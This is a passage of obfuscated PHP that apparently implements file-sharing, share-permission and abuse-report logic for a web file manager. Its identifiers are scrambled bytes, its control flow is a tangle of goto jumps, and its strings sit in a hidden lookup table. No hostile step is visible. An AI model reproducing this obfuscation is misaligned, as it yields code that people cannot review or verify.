díÒÎä“Šƒ; f±ñÇŸÁˆÒ: $E»Áã›÷­ = array($aš˜®’Õ´â[521] => SourceModel::TYPE_USER, $aš˜®’Õ´â[456] => USER_ID); if ($c°©–³¾Å·) { $E»Áã›÷­ = array(array($aš˜®’Õ´â[521] => SourceModel::TYPE_USER, $aš˜®’Õ´â[456] => USER_ID), array($aš˜®’Õ´â[521] => SourceModel::TYPE_GROUP, $aš˜®’Õ´â[456] => array($aš˜®’Õ´â[7], $c°©–³¾Å·)), $aš˜®’Õ´â[2218] => $aš˜®’Õ´â[2187]); } $d®‡íí—¯÷ = Model($aš˜®’Õ´â[537])->where($E»Áã›÷­)->selectPage($fŠä§ØÕÛ); goto Fµ’ä—§Ò«; Fµ’ä—§Ò«: $E¦œè ‡Ä£ = array_to_keyvalue_group($d®‡íí—¯÷[$aš˜®’Õ´â[354]], $aš˜®’Õ´â[441]); if (!$E¦œè ‡Ä£) { return $d®‡íí—¯÷; } $Aö˜Æ´’À = $aš˜®’Õ´â[2220]; goto cÍ‹‡‹îØÔ; cÍ‹‡‹îØÔ: $E»Áã›÷­ = array($aš˜®’Õ´â[441] => array($aš˜®’Õ´â[384], array_keys($E¦œè ‡Ä£))); $B£„õœ†ŠÈ = $this->field($Aö˜Æ´’À)->where($E»Áã›÷­)->select(); foreach ($B£„õœ†ŠÈ as $d…ëÓŞ‡®Ñ => &$dáÁó—µà³) { $dáÁó—µà³[$aš˜®’Õ´â[2217]] = $E¦œè ‡Ä£[$dáÁó—µà³[$aš˜®’Õ´â[441]]]; } goto còíÏÄğÙÈ; díÒÎä“Šƒ: } protected function shareAdd($Dˆ—‹×‘ºŒ, $a½çÚ…™å) { $dßëç¿¾Š =& $_SERVER[‚Ğ°–—î]; $CáÄ‘Ë¬ˆ = $this->_addShareData($Dˆ—‹×‘ºŒ, $a½çÚ…™å); if (!empty($a½çÚ…™å[$dßëç¿¾Š[2223]])) { $this->_shareAuthSet($CáÄ‘Ë¬ˆ, $a½çÚ…™å[$dßëç¿¾Š[2223]]); } $this->shareEventAdd($Dˆ—‹×‘ºŒ, $a½çÚ…™å, $dßëç¿¾Š[1012]); return $CáÄ‘Ë¬ˆ; } private function shareEventAdd($E…ƒ‚”•¦É, $cø–°æ“é, $aƒ™İî‚Ä = "\141\x64\144") { goto fàµ’ã‚¥„; fàµ’ã‚¥„: $EùõŠÎŒâ =& $_SERVER[‚Ğ°–—î]; if ($aƒ™İî‚Ä == $EùõŠÎŒâ[1012]) { if ($cø–°æ“é[$EùõŠÎŒâ[446]] == $EùõŠÎŒâ[83]) { Model($EùõŠÎŒâ[505])->eventShare($E…ƒ‚”•¦É, $EùõŠÎŒâ[2224]); } if ($cø–°æ“é[$EùõŠÎŒâ[448]] == $EùõŠÎŒâ[83]) { Model($EùõŠÎŒâ[505])->eventShare($E…ƒ‚”•¦É, $EùõŠÎŒâ[2225]); } return; } $AôŒšîÌÉª = $this->getInfoByPath($E…ƒ‚”•¦É); goto A ‡íñöÄ; cïéŒÆ“ïÍ: if ($AôŒšîÌÉª[$EùõŠÎŒâ[448]] == $EùõŠÎŒâ[468] && $cø–°æ“é[$EùõŠÎŒâ[448]] == $EùõŠÎŒâ[83]) { $DÃÍ†‹æâ¯ = $EùõŠÎŒâ[2225]; } if ($AôŒšîÌÉª[$EùõŠÎŒâ[448]] == $EùõŠÎŒâ[83] && $cø–°æ“é[$EùõŠÎŒâ[448]] == $EùõŠÎŒâ[468]) { $DÃÍ†‹æâ¯ = $EùõŠÎŒâ[2228]; } Model($EùõŠÎŒâ[505])->eventShare($E…ƒ‚”•¦É, $DÃÍ†‹æâ¯); goto fÖ‹ÛÛÜ§; A ‡íñöÄ: $DÃÍ†‹æâ¯ = $EùõŠÎŒâ[2226]; if ($AôŒšîÌÉª[$EùõŠÎŒâ[446]] == $EùõŠÎŒâ[468] && $cø–°æ“é[$EùõŠÎŒâ[446]] == $EùõŠÎŒâ[83]) { $DÃÍ†‹æâ¯ = $EùõŠÎŒâ[2224]; } if ($AôŒšîÌÉª[$EùõŠÎŒâ[446]] == $EùõŠÎŒâ[83] && $cø–°æ“é[$EùõŠÎŒâ[446]] == $EùõŠÎŒâ[468]) { $DÃÍ†‹æâ¯ = $EùõŠÎŒâ[2227]; } goto cïéŒÆ“ïÍ; fÖ‹ÛÛÜ§: return; goto Bè½İ¦ğ©¿; Bè½İ¦ğ©¿: } private function _addShareData($e‰–²òñÚè, $bƒäï”µö¦ = array()) { goto eÑµÙ‰Â; FœË­İ¤Ò: $açê—ßÄ­í = array($cîÃÈµ½¿ñ[1429] => USER_ID, $cîÃÈµ½¿ñ[383] => $e‰–²òñÚè, $cîÃÈµ½¿ñ[1344] => $cîÃÈµ½¿ñ[33], $cîÃÈµ½¿ñ[446] => 0, $cîÃÈµ½¿ñ[448] => 0, $cîÃÈµ½¿ñ[1020] => $cîÃÈµ½¿ñ[33], $cîÃÈµ½¿ñ[295] => $cîÃÈµ½¿ñ[33], $cîÃÈµ½¿ñ[802] => $cîÃÈµ½¿ñ[33], $cîÃÈµ½¿ñ[2230] => 0, $cîÃÈµ½¿ñ[2231] => 0, $cîÃÈµ½¿ñ[702] => 0, $cîÃÈµ½¿ñ[2232] => $cîÃÈµ½¿ñ[33], $cîÃÈµ½¿ñ[443] => $cîÃÈµ½¿ñ[33]); $e¸Ê¾î‡µ = explode($cîÃÈµ½¿ñ[47], $cîÃÈµ½¿ñ[2233]); foreach ($e¸Ê¾î‡µ as $aë‚‚£Â† ) { if (!isset($bƒäï”µö¦[$aë‚‚£Â† ])) { continue; } $açê—ßÄ­í[$aë‚‚£Â† ] = $bƒäï”µö¦[$aë‚‚£Â† ]; } goto D‰è¶½Í´ ; eÑµÙ‰Â: $cîÃÈµ½¿ñ =& $_SERVER[‚Ğ°–—î]; $B»ÄÄÛÓÌ… = array($cîÃÈµ½¿ñ[383] => $e‰–²òñÚè, $cîÃÈµ½¿ñ[1429] => USER_ID); if ($e‰–²òñÚè == 0) { $B»ÄÄÛÓÌ… = array($cîÃÈµ½¿ñ[2229] => $bƒäï”µö¦[$cîÃÈµ½¿ñ[1020]], $cîÃÈµ½¿ñ[1429] => USER_ID); } goto Fñƒ¨÷Ô’ñ; D‰è¶½Í´ : $A¼òŸ¾½Ø = $this->add($açê—ßÄ­í); $EÔî¾„‚ = array($cîÃÈµ½¿ñ[443] => short_id($A¼òŸ¾½Ø)); $this->where(array($cîÃÈµ½¿ñ[440] => $A¼òŸ¾½Ø))->save($EÔî¾„‚); goto E‘ÁÏ™Ã; E‘ÁÏ™Ã: return $A¼òŸ¾½Ø; goto C‰¬ïƒàŠÌ; Fñƒ¨÷Ô’ñ: if ($EŠãøÙ¯£² = $this->where($B»ÄÄÛÓÌ…)->find()) { return $EŠãøÙ¯£²[$cîÃÈµ½¿ñ[441]]; } if ($e‰–²òñÚè == 0) { $f¦¿°ğ¡•Ê = array($cîÃÈµ½¿ñ[28] => get_path_this($bƒäï”µö¦[$cîÃÈµ½¿ñ[75]])); } else { $f¦¿°ğ¡•Ê = Model($cîÃÈµ½¿ñ[752])->sourceInfo($e‰–²òñÚè); if (!$f¦¿°ğ¡•Ê) { return !1; } } if (!$bƒäï”µö¦[$cîÃÈµ½¿ñ[1344]]) { $bƒäï”µö¦[$cîÃÈµ½¿ñ[1344]] = $f¦¿°ğ¡•Ê[$cîÃÈµ½¿ñ[28]]; } goto FœË­İ¤Ò; C‰¬ïƒàŠÌ: } private function _shareAuthSet($AÆó¾ ´Í¬, $dÖæÌ”ºÏ†) { goto a¸˜éİá‡†; BáÉ—Ä½·Ë: $FİéÁÂ§ÆÄ->where(array($Cé›ğŒĞ’ê[441] => $AÆó¾ ´Í¬))->delete(); $BÚØ¨ÓÆß = array(); foreach ($dÖæÌ”ºÏ† as $f’Å£åœÕª) { $e âŒÂ×Èƒ = SourceModel::TYPE_USER; if ($f’Å£åœÕª[$Cé›ğŒĞ’ê[371]] == SourceModel::TYPE_GROUP) { $e âŒÂ×Èƒ = SourceModel::TYPE_GROUP; } $fÜõÓ†«…± = array($Cé›ğŒĞ’ê[441] => $AÆó¾ ´Í¬, $Cé›ğŒĞ’ê[371] => $e âŒÂ×Èƒ, $Cé›ğŒĞ’ê[456] => intval($f’Å£åœÕª[$Cé›ğŒĞ’ê[456]]), $Cé›ğŒĞ’ê[2235] => 0, $Cé›ğŒĞ’ê[2236] => -1); if ($f’Å£åœÕª[$Cé›ğŒĞ’ê[2235]]) { $fÜõÓ†«…±[$Cé›ğŒĞ’ê[2235]] = $f’Å£åœÕª[$Cé›ğŒĞ’ê[2235]]; } else { if ($f’Å£åœÕª[$Cé›ğŒĞ’ê[2236]]) { $fÜõÓ†«…±[$Cé›ğŒĞ’ê[2236]] = $f’Å£åœÕª[$Cé›ğŒĞ’ê[2236]]; } } $BÚØ¨ÓÆß[] = $fÜõÓ†«…±; } goto A‘•ƒ‚—“É; A‘•ƒ‚—“É: return $FİéÁÂ§ÆÄ->addAll($BÚØ¨ÓÆß, array(), !0); goto AÍ¿Š’Ş¾¸; a¸˜éİá‡†: $Cé›ğŒĞ’ê =& $_SERVER[‚Ğ°–—î]; if (!is_array($dÖæÌ”ºÏ†)) { return !1; } $FİéÁÂ§ÆÄ = Model($Cé›ğŒĞ’ê[2234]); goto BáÉ—Ä½·Ë; AÍ¿Š’Ş¾¸: } public function numViewAdd($cä‚”¬¹ôä) { $CÄ¤±ÚÃˆ =& $_SERVER[‚Ğ°–—î]; $eÕ¹“—šÎ = array($CÄ¤±ÚÃˆ[440] => $cä‚”¬¹ôä); $this->where($eÕ¹“—šÎ)->setAdd($CÄ¤±ÚÃˆ[2230]); } public function numDownloadAdd($f›¤Õô“Á¶) { $fõã•™º‚ß =& $_SERVER[‚Ğ°–—î]; $Cù‹¿¦‘à½ = array($fõã•™º‚ß[440] => $f›¤Õô“Á¶); $this->where($Cù‹¿¦‘à½)->setAdd($fõã•™º‚ß[2231]); } protected function shareEdit($C°ö¶¹ñ¥, $cŠ“¥¾İÍ) { goto Eœ¯×•ºÇ; b”ìøÆÂŞï: if (isset($cŠ“¥¾İÍ[$FÕ‡ËÌÑ¥Ú[2223]])) { $this->_shareAuthSet($C°ö¶¹ñ¥, $cŠ“¥¾İÍ[$FÕ‡ËÌÑ¥Ú[2223]]); } return !0; goto EÏÔ§ù›†è; aØ¹©ÃÅ¤—: $this->_checkLinkShare($cŠ“¥¾İÍ, $CÈÓùÜ†ŸŸ); $B‹Ñ„—à¡‹ = array(); $b›œªÒÈ§™ = explode($FÕ‡ËÌÑ¥Ú[47], $FÕ‡ËÌÑ¥Ú[2237]); goto F¡ì ôÆíÔ; Eœ¯×•ºÇ: $FÕ‡ËÌÑ¥Ú =& $_SERVER[‚Ğ°–—î]; $CÈÓùÜ†ŸŸ = $this->getInfo($C°ö¶¹ñ¥); if (!$CÈÓùÜ†ŸŸ) { return !1; } goto aØ¹©ÃÅ¤—; F¡ì ôÆíÔ: foreach ($b›œªÒÈ§™ as $bÊ·‹„) { if (!array_key_exists($bÊ·‹„, $cŠ“¥¾İÍ)) { continue; } $B‹Ñ„—à¡‹[$bÊ·‹„] = $cŠ“¥¾İÍ[$bÊ·‹„]; } $this->shareEventAdd($CÈÓùÜ†ŸŸ[$FÕ‡ËÌÑ¥Ú[369]], $cŠ“¥¾İÍ, $FÕ‡ËÌÑ¥Ú[2074]); $this->where(array($FÕ‡ËÌÑ¥Ú[440] => $C°ö¶¹ñ¥))->save($B‹Ñ„—à¡‹); goto b”ìøÆÂŞï; EÏÔ§ù›†è: } private function _checkLinkShare($aá½Èğ¯Ş, $EìáªŒ„áğ) { goto bù˜“éƒ×º; bù˜“éƒ×º: $eÄŠ¶ß„©„ =& $_SERVER[‚Ğ°–—î]; if ($aá½Èğ¯Ş[$eÄŠ¶ß„©„[446]] != $eÄŠ¶ß„©„[83]) { return; } $B¥Ä¹–Û§¡ = $EìáªŒ„áğ[$eÄŠ¶ß„©„[391]][$eÄŠ¶ß„©„[369]]; goto bÓ±¯ß©”·; bÓ±¯ß©”·: if ($EìáªŒ„áğ[$eÄŠ¶ß„©„[391]][$eÄŠ¶ß„©„[29]] != $eÄŠ¶ß„©„[167]) { $d²½¡Ç¬¯ = $this->_folderReport($B¥Ä¹–Û§¡); if (!$d²½¡Ç¬¯) { return; } show_json(LNG($eÄŠ¶ß„©„[2238]) . $eÄŠ¶ß„©„[2239] . $d²½¡Ç¬¯, !1); } $dì§óïì©Ï = Model($eÄŠ¶ß„©„[752])->fileInfoGet($EìáªŒ„áğ[$eÄŠ¶ß„©„[391]][$eÄŠ¶ß„©„[369]]); if (!$dì§óïì©Ï) { return; } goto dÕÆ…Ã¨‘; dÕÆ…Ã¨‘: $f´ñçÏßĞ´ = $this->shareFileMeta($dì§óïì©Ï[$eÄŠ¶ß„©„[419]]); if (isset($f´ñçÏßĞ´[$eÄŠ¶ß„©„[359]]) && $f´ñçÏßĞ´[$eÄŠ¶ß„©„[359]] == $eÄŠ¶ß„©„[83]) { show_json(LNG($eÄŠ¶ß„©„[2240]), !1); } goto Có„‰¦¯; Có„‰¦¯: } private function _folderReport($eë·©–ÁˆÌ) { goto eíôÑÚ–³; eë¯½Ÿ¿¥ñ: $dÃëªÔ ” = array($aåÑ‰ó­å[419] => array($aåÑ‰ó­å[7], $a³™Ì‹), $aåÑ‰ó­å[459] => array($aåÑ‰ó­å[751], "\x25{$aÈŠ¦âÕµ­}\x25"), $aåÑ‰ó­å[397] => 0); $FªÅÙî ®× = Model($aåÑ‰ó­å[752])->where($dÃëªÔ ”)->field($aåÑ‰ó­å[2242])->find(); if (!$FªÅÙî ®×) { return !1; } goto FÓ›Å’§; FÓ›Å’§: $d×å®·¤Ã = substr($FªÅÙî ®×[$aåÑ‰ó­å[459]], strpos($FªÅÙî ®×[$aåÑ‰ó­å[459]], $aÈŠ¦âÕµ­)); $dÃëªÔ ” = array($aåÑ‰ó­å[369] => array($aåÑ‰ó­å[7], trim($d×å®·¤Ã, $aåÑ‰ó­å[47]))); $D´Œ¥¼«° = Model($aåÑ‰ó­å[752])->where($dÃëªÔ ”)->field($aåÑ‰ó­å[28])->select(); goto E¥â†ÕÍáÔ; A¥Ÿœ¦—˜: if (!$a³™Ì‹) { return !1; } $a³™Ì‹ = array_to_keyvalue($a³™Ì‹, $aåÑ‰ó­å[33], $aåÑ‰ó­å[419]); $aÈŠ¦âÕµ­ = $aåÑ‰ó­å[47] . $eë·©–ÁˆÌ . $aåÑ‰ó­å[47]; goto eë¯½Ÿ¿¥ñ; eíôÑÚ–³: $aåÑ‰ó­å =& $_SERVER[‚Ğ°–—î]; $dÃëªÔ ” = array($aåÑ‰ó­å[419] => array($aåÑ‰ó­å[927], 0), $aåÑ‰ó­å[688] => 3); $a³™Ì‹ = Model($aåÑ‰ó­å[2241])->where($dÃëªÔ ”)->field($aåÑ‰ó­å[419])->select(); goto A¥Ÿœ¦—˜; E¥â†ÕÍáÔ: $A¶ëñ¥Üê = array_to_keyvalue($D´Œ¥¼«°, $aåÑ‰ó­å[33], $aåÑ‰ó­å[28]); $A¶ëñ¥Üê[] = $FªÅÙî ®×[$aåÑ‰ó­å[28]]; return implode($aåÑ‰ó­å[8], $A¶ëñ¥Üê); goto DÅ©’‘§Ó¼; DÅ©’‘§Ó¼: } protected function remove($cÍ®‡ËĞ–‘) { goto béì­Í‚ô; béì­Í‚ô: $e¬¬×Š¯» =& $_SERVER[‚Ğ°–—î]; if (is_array($cÍ®‡ËĞ–‘)) { $cÍ®‡ËĞ–‘ = array($e¬¬×Š¯»[7], $cÍ®‡ËĞ–‘); } $Fä‚¹»šÊÑ = array($e¬¬×Š¯»[441] => $cÍ®‡ËĞ–‘); goto C† ©êèõ—; C† ©êèõ—: $fÌ¢ÀÆğÛİ = $this->where($Fä‚¹»šÊÑ)->delete(); if ($fÌ¢ÀÆğÛİ) { Model($e¬¬×Š¯»[537])->where(array($e¬¬×Š¯»[441] => $cÍ®‡ËĞ–‘))->delete(); } $b»ëâ×Ã» = is_array($cÍ®‡ËĞ–‘) ? $cÍ®‡ËĞ–‘[1] : array($cÍ®‡ËĞ–‘); goto Aß‘Ø«èº; Aß‘Ø«èº: for ($d¯äÀËÒœË = 0; $d¯äÀËÒœË < count($b»ëâ×Ã»); $d¯äÀËÒœË++) { $DÚßä•÷µ… = $this->getInfo($b»ëâ×Ã»[$d¯äÀËÒœË]); if ($DÚßä•÷µ…[$e¬¬×Š¯»[448]] == $e¬¬×Š¯»[83]) { Model($e¬¬×Š¯»[505])->eventShare($DÚßä•÷µ…[$e¬¬×Š¯»[369]], $e¬¬×Š¯»[2228]); } if ($DÚßä•÷µ…[$e¬¬×Š¯»[446]] == $e¬¬×Š¯»[83]) { Model($e¬¬×Š¯»[505])->eventShare($DÚßä•÷µ…[$e¬¬×Š¯»[369]], $e¬¬×Š¯»[2227]); } } return $fÌ¢ÀÆğÛİ; goto cÇ›î†åŞ; cÇ›î†åŞ: } protected function removeBySource($c·ŠÔÕ‹—ï) { goto dÏÃ×À¬¿ø; dÏÃ×À¬¿ø: $b‘¸é³Øß =& $_SERVER[‚Ğ°–—î]; $c»Ğ’ÂÂá = array($b‘¸é³Øß[383] => array($b‘¸é³Øß[384], $c·ŠÔÕ‹—ï)); $cÅÛ¨àæŒŠ = $this->field($b‘¸é³Øß[441])->where($c»Ğ’ÂÂá)->select(); goto AÕ¤îäÊ; FŸÊµ‘‘¡Ó: $this->where($c»Ğ’ÂÂá)->delete(); Model($b‘¸é³Øß[537])->where($c»Ğ’ÂÂá)->delete(); goto DÇÑµºÓ»ƒ; AÕ¤îäÊ: $cÅÛ¨àæŒŠ = array_to_keyvalue($cÅÛ¨àæŒŠ, $b‘¸é³Øß[33], $b‘¸é³Øß[441]); if (!$cÅÛ¨àæŒŠ) { return; } $c»Ğ’ÂÂá = array($b‘¸é³Øß[440] => array($b‘¸é³Øß[384], $cÅÛ¨àæŒŠ)); goto FŸÊµ‘‘¡Ó; DÇÑµºÓ»ƒ: } public function listAll($bÀÔÔÂÆËÚ) { goto aÆÎ²Ñö†«; aÆÎ²Ñö†«: $Aõäˆå² =& $_SERVER[‚Ğ°–—î]; $B’—™ÅÎŸ° = array(); if ($bÀÔÔÂÆËÚ[$Aõäˆå²[1438]]) { $B’—™ÅÎŸ°[$Aõäˆå²[1438]] = $bÀÔÔÂÆËÚ[$Aõäˆå²[1438]]; } goto ağ¥ğÚÑù¾; ağ¥ğÚÑù¾: if ($bÀÔÔÂÆËÚ[$Aõäˆå²[701]]) { $AõÙƒóªÁƒ = $bÀÔÔÂÆËÚ[$Aõäˆå²[702]] ? $bÀÔÔÂÆËÚ[$Aõäˆå²[702]] : strtotime(date($Aõäˆå²[2243])); $B’—™ÅÎŸ°[$Aõäˆå²[187]] = array($Aõäˆå²[321], array($bÀÔÔÂÆËÚ[$Aõäˆå²[701]], $AõÙƒóªÁƒ)); } if ($bÀÔÔÂÆËÚ[$Aõäˆå²[29]]) { $B’—™ÅÎŸ°[$bÀÔÔÂÆËÚ[$Aõäˆå²[29]]] = 1; } else { $B’—™ÅÎŸ°[] = array($Aõäˆå²[446] => array($Aõäˆå²[927], 0), $Aõäˆå²[448] => array($Aõäˆå²[927], 0), $Aõäˆå²[2218] => $Aõäˆå²[2187]); } if ($bÀÔÔÂÆËÚ[$Aõäˆå²[2183]]) { $B’—™ÅÎŸ°[] = array($Aõäˆå²[443] => $bÀÔÔÂÆËÚ[$Aõäˆå²[2183]], $Aõäˆå²[1344] => array($Aõäˆå²[751], "\45{$bÀÔÔÂÆËÚ[$Aõäˆå²[2183]]}\x25"), $Aõäˆå²[2218] => $Aõäˆå²[2187]); } goto A»„¹¨½Ù; DôøÏ¬ÔÆÈ: return $EÓ÷©‹¹ƒ; goto B¶Îßêˆ±ª; A»„¹¨½Ù: $EÓ÷©‹¹ƒ = $this->_makeOrder()->where($B’—™ÅÎŸ°)->selectPage(20); if (empty($EÓ÷©‹¹ƒ[$Aõäˆå²[354]])) { return array(); } $this->_listDataApply($EÓ÷©‹¹ƒ[$Aõäˆå²[354]]); goto DôøÏ¬ÔÆÈ; B¶Îßêˆ±ª: } public function listDataApply($fõ‡ÛŸÆ§) { $this->_listDataApply($fõ‡ÛŸÆ§); return $fõ‡ÛŸÆ§; } private function _listDataApply(&$F³ÒÎäŒëÍ) { $e°Œ»ÏŠš =& $_SERVER[‚Ğ°–—î]; $A ’â…ã = array_to_keyvalue($F³ÒÎäŒëÍ, $e°Œ»ÏŠš[33], $e°Œ»ÏŠš[1438]); $BªİáóÃ·° = Model($e°Œ»ÏŠš[477])->userListInfo(array_unique($A ’â…ã)); $B§„†Ğ‚ÍÅ = array_to_keyvalue($F³ÒÎäŒëÍ, $e°Œ»ÏŠš[33], $e°Œ»ÏŠš[369]); $aóäÂ˜‚®À = Model($e°Œ»ÏŠš[752])->sourceListInfo($B§„†Ğ‚ÍÅ, !0); foreach ($F³ÒÎäŒëÍ as &$a¶°ßåˆ†) { $AóÄÇƒ†ß› = $a¶°ßåˆ†[$e°Œ»ÏŠš[1438]]; $a¶°ßåˆ†[$e°Œ»ÏŠš[2244]] = $BªİáóÃ·°[$AóÄÇƒ†ß›] ? $BªİáóÃ·°[$AóÄÇƒ†ß›] : !1; $EÂÏ´Ç»× = $a¶°ßåˆ†[$e°Œ»ÏŠš[369]]; $a¶°ßåˆ†[$e°Œ»ÏŠš[391]] = $aóäÂ˜‚®À[$EÂÏ´Ç»×] ? $aóäÂ˜‚®À[$EÂÏ´Ç»×] : !1; } } private function _makeOrder($b—›áéÅÓ = '') { goto CÚïñÂÇà; fÑİÓÍÌÏ¿: $b—›áéÅÓ = $b—›áéÅÓ . "{$cä·‹Û‰ï}\40{$cŞùÃ¹ÅÍ}"; return $this->order($b—›áéÅÓ); goto f©ƒ«—Ì‹; CÚïñÂÇà: $D¤šªà§µ¤ =& $_SERVER[‚Ğ°–—î]; $DÌ‘ß±ƒ = array($D¤šªà§µ¤[187], $D¤šªà§µ¤[702], $D¤šªà§µ¤[2230], $D¤šªà§µ¤[2231]); $e¿Ó…àµ°§ = array($D¤šªà§µ¤[402] => $D¤šªà§µ¤[403], $D¤šªà§µ¤[404] => $D¤šªà§µ¤[405]); goto A “ã¡î‡; A “ã¡î‡: $cä·‹Û‰ï = Input::get($D¤šªà§µ¤[407], $D¤šªà§µ¤[7], $D¤šªà§µ¤[389], $DÌ‘ß±ƒ); $cŞùÃ¹ÅÍ = Input::get($D¤šªà§µ¤[408], $D¤šªà§µ¤[7], $D¤šªà§µ¤[2245], array($D¤šªà§µ¤[2182], $D¤šªà§µ¤[404])); $cŞùÃ¹ÅÍ = $e¿Ó…àµ°§[$cŞùÃ¹ÅÍ]; goto fÑİÓÍÌÏ¿; f©ƒ«—Ì‹: } public function reportAdd($CÑ’—²Ú®) { $aÎ¹«æ =& $_SERVER[‚Ğ°–—î]; $e¬Ãìâ×å— = array($aÎ¹«æ[441] => $CÑ’—²Ú®[$aÎ¹«æ[441]], $aÎ¹«æ[1438] => USER_ID); if (Model($aÎ¹«æ[2241])->where($e¬Ãìâ×å—)->find()) { return !1; } $E‘©¨ÖÒîø = array($aÎ¹«æ[441] => $CÑ’—²Ú®[$aÎ¹«æ[441]], $aÎ¹«æ[1344] => $CÑ’—²Ú®[$aÎ¹«æ[1344]], $aÎ¹«æ[369] => $CÑ’—²Ú®[$aÎ¹«æ[369]], $aÎ¹«æ[419] => $CÑ’—²Ú®[$aÎ¹«æ[419]], $aÎ¹«æ[1438] => USER_ID, $aÎ¹«æ[29] => $CÑ’—²Ú®[$aÎ¹«æ[29]], $aÎ¹«æ[405] => $CÑ’—²Ú®[$aÎ¹«æ[405]]); return Model($aÎ¹«æ[2241])->add($E‘©¨ÖÒîø); } public function reportList($fµ£ßÛ—˜İ) { goto f„´ˆë™à”; Aø¥ĞÁª: if (isset($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[29]]) && in_array($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[29]], array($bÌÏÁ‡ìİğ[83], $bÌÏÁ‡ìİğ[2246], $bÌÏÁ‡ìİğ[2247], $bÌÏÁ‡ìİğ[2248], $bÌÏÁ‡ìİğ[1921]))) { $e‚œˆ¾‘‚é[$bÌÏÁ‡ìİğ[29]] = $fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[29]]; } if (isset($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[688]]) && in_array($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[688]], array($bÌÏÁ‡ìİğ[468], $bÌÏÁ‡ìİğ[83], $bÌÏÁ‡ìİğ[2246], $bÌÏÁ‡ìİğ[2247]))) { $e‚œˆ¾‘‚é[$bÌÏÁ‡ìİğ[688]] = $fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[688]]; } $C‚¸˜Ãæ„ = Input::get($bÌÏÁ‡ìİğ[408], $bÌÏÁ‡ìİğ[7], $bÌÏÁ‡ìİğ[2245], array($bÌÏÁ‡ìİğ[2182], $bÌÏÁ‡ìİğ[404])); goto Aå»“‘±; Aå»“‘±: $bÉÃ¨ˆÆèË = array($bÌÏÁ‡ìİğ[402] => $bÌÏÁ‡ìİğ[403], $bÌÏÁ‡ìİğ[404] => $bÌÏÁ‡ìİğ[405]); $C˜ò¢Äó…¡ = $bÌÏÁ‡ìİğ[2249] . $bÉÃ¨ˆÆèË[$C‚¸˜Ãæ„]; $fÓƒóÄï´ó = Model($bÌÏÁ‡ìİğ[2241])->where($e‚œˆ¾‘‚é)->order($C˜ò¢Äó…¡)->selectPage(20); goto fí˜ŒëÁŠ; fí˜ŒëÁŠ: if (empty($fÓƒóÄï´ó[$bÌÏÁ‡ìİğ[354]])) { return array(); } $this->_listDataApply($fÓƒóÄï´ó[$bÌÏÁ‡ìİğ[354]]); return $fÓƒóÄï´ó; goto Cİ«¥ŠÁÚÈ; f„´ˆë™à”: $bÌÏÁ‡ìİğ =& $_SERVER[‚Ğ°–—î]; $e‚œˆ¾‘‚é = array(); if ($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[701]]) { $EƒÉ£¿¿ = $fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[702]] ? $fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[702]] : strtotime(date($bÌÏÁ‡ìİğ[2243])); $e‚œˆ¾‘‚é[$bÌÏÁ‡ìİğ[187]] = array($bÌÏÁ‡ìİğ[321], array($fµ£ßÛ—˜İ[$bÌÏÁ‡ìİğ[701]], $EƒÉ£¿¿)); } goto Aø¥ĞÁª; Cİ«¥ŠÁÚÈ: } public function reportStatus($b‚ÉÒŸÅ) { goto Eƒª¦à™ ; F³äå½­ë·: if (!$F¦ˆê¤ğŠ) { return !1; } $C í„‚ÕŠì = array($DŠˆÎ‰ËÔ[688] => $b‚ÉÒŸÅ[$DŠˆÎ‰ËÔ[688]]); if ($b‚ÉÒŸÅ[$DŠˆÎ‰ËÔ[688]] == $DŠˆÎ‰ËÔ[2247] && $F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[688]] == $DŠˆÎ‰ËÔ[2247]) { $C í„‚ÕŠì[$DŠˆÎ‰ËÔ[688]] = 0; } goto A†»‘Š†‹Ï; A†»‘Š†‹Ï: $a‘Ì¢²èê = Model($DŠˆÎ‰ËÔ[2241])->where($A±˜§ÍÙŒ)->save($C í„‚ÕŠì); if ($b‚ÉÒŸÅ[$DŠˆÎ‰ËÔ[688]] == $DŠˆÎ‰ËÔ[2246]) { if ($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[419]] != $DŠˆÎ‰ËÔ[468] && $this->shareFileMeta($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[419]])) { $this->shareFileMeta($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[419]], 0); } $this->remove($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[441]]); return !0; } if ($a‘Ì¢²èê && $b‚ÉÒŸÅ[$DŠˆÎ‰ËÔ[688]] == $DŠˆÎ‰ËÔ[2247]) { $F¤íËÇ´ÚÎ = $C í„‚ÕŠì[$DŠˆÎ‰ËÔ[688]] == $DŠˆÎ‰ËÔ[2247] ? 1 : 0; $this->shareFileMeta($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[419]], $F¤íËÇ´ÚÎ); $this->removeByFile($F¦ˆê¤ğŠ[$DŠˆÎ‰ËÔ[419]]); } goto eÉó´º®Æ; Eƒª¦à™ : $DŠˆÎ‰ËÔ =& $_SERVER[‚Ğ°–—î]; $A±˜§ÍÙŒ = array($DŠˆÎ‰ËÔ[367] => $b‚ÉÒŸÅ[$DŠˆÎ‰ËÔ[367]]); $F¦ˆê¤ğŠ = Model($DŠˆÎ‰ËÔ[2241])->where($A±˜§ÍÙŒ)->field($DŠˆÎ‰ËÔ[2250])->find(); goto F³äå½­ë·; eÉó´º®Æ: return $a‘Ì¢²èê; goto Aµå³ÊŸõ; Aµå³ÊŸõ: } private function removeByFile($CÑã…ìº”Å) { goto BÄÑ¨Ø­â×; BÄÑ¨Ø­â×: $cô¯Ê¦­•ê =& $_SERVER[‚Ğ°–—î]; $dœÔßØ„¹„ = Model($cô¯Ê¦­•ê[752])->where(array($cô¯Ê¦­•ê[419] => $CÑã…ìº”Å))->field($cô¯Ê¦­•ê[369])->select(); $DØ’é¶Ã¢• = array_to_keyvalue($dœÔßØ„¹„, $cô¯Ê¦­•ê[33], $cô¯Ê¦­•ê[369]); goto AÙ¨§ÔóØë; AÙ¨§ÔóØë: $b—´Ø…½ãå = array($cô¯Ê¦­•ê[369] => array($cô¯Ê¦­•ê[7], $DØ’é¶Ã¢•), 